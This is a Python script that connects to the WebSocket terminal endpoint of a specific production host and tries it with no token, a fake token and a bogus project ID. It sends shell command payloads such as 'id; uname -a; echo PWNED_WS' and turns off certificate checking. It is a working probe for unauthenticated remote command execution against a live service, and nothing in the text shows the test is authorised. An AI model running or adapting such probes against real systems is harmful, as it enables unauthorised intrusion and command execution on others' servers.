import websocket, json, time, sys

HOST="mc-control-production-089b.up.railway.app"
def try_ws(url, label, msgs):
    print(f"\n=== {label} ===\n{url}")
    out=[]
    try:
        ws=websocket.create_connection(url, timeout=8, sslopt={"cert_reqs":0})
        print("CONNECT: OPEN (101)")
        for m in msgs:
            try: ws.send(m); print("sent:", m[:60])
            except Exception as e: print("send err", e)
        ws.settimeout(3)
        t0=time.time()
        while time.time()-t0<4:
            try:
                d=ws.recv()
                out.append(d)
                print("RECV:", d[:200])
            except websocket.WebSocketTimeoutException:
                break
            except Exception as e:
                print("recv err:", e); break
        ws.close()
    except Exception as e:
        print("CONNECT FAILED:", repr(e)[:200])
    return out

msgs=['{"type":"input","data":"id; uname -a; echo PWNED_WS\\n"}',
      '{"type":"command","data":"id\\n"}',
      'id; uname -a; echo PWNED_WS\n']
try_ws(f"wss://{HOST}/ws?mode=terminal&projectId=probe_unauth", "NO TOKEN, bogus projectId", msgs)
try_ws(f"wss://{HOST}/ws?mode=terminal&projectId=probe_unauth&token=FAKE.TOKEN.HERE", "FAKE TOKEN, bogus projectId", msgs)
try_ws(f"wss://{HOST}/ws?projectId=probe_unauth&token=FAKE", "non-terminal ws, fake token", msgs)
